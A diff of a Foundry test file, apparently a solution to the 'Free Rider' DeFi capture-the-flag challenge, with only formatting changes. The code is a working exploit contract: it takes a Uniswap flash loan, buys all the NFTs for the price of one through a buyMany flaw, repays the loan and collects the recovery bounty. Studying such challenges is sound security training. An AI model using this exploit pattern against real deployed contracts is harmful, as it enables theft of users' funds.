@@ -126,7 +126,9 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        FreeRiderExploit exploit = new FreeRiderExploit(address(uniswapPair), address(marketplace), address(nft), address(weth), address(recoveryManager));
+        FreeRiderExploit exploit = new FreeRiderExploit(
+            address(uniswapPair), address(marketplace), address(nft), address(weth), address(recoveryManager)
+        );
         exploit.attack();
         // now the balance should be 45 ETH bounty given from recovery manager
     }
@@ -155,12 +157,13 @@ contract FreeRiderChallenge is Test {
 interface IMarketPlace {
     function buyMany(uint256[] calldata tokenIds) external payable;
 }
+
 contract FreeRiderExploit {
     IUniswapV2Pair public pair;
     IMarketPlace public marketplace;
     IWETH public weth;
     IERC721 public nft;
-    
+
     address public recoveryContract;
     address public player;
 
@@ -183,20 +186,19 @@ contract FreeRiderExploit {
 
     function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
         require(msg.sender == address(pair), "not pair");
-        
-        weth.withdraw(NFT_PRICE);
-        // for the price of one, buy all nfts 
-        marketplace.buyMany{value: NFT_PRICE}(tokens);
 
+        weth.withdraw(NFT_PRICE);
+        // for the price of one, buy all nfts
+        marketplace.buyMany{value: NFT_PRICE}(tokens);
 
         // payback the loan with interest
         uint256 payback = NFT_PRICE * 1004 / 1000;
         weth.deposit{value: payback}();
         weth.transfer(address(pair), payback);
 
-        // send all nfts to recovery address, 
+        // send all nfts to recovery address,
         bytes memory data = abi.encode(player);
-        for(uint256 i = 0; i < tokens.length; i++) {
+        for (uint256 i = 0; i < tokens.length; i++) {
             nft.safeTransferFrom(address(this), recoveryContract, i, data);
         }
     }
@@ -206,6 +208,4 @@ contract FreeRiderExploit {
     }
 
     receive() external payable {}
-
-
 }
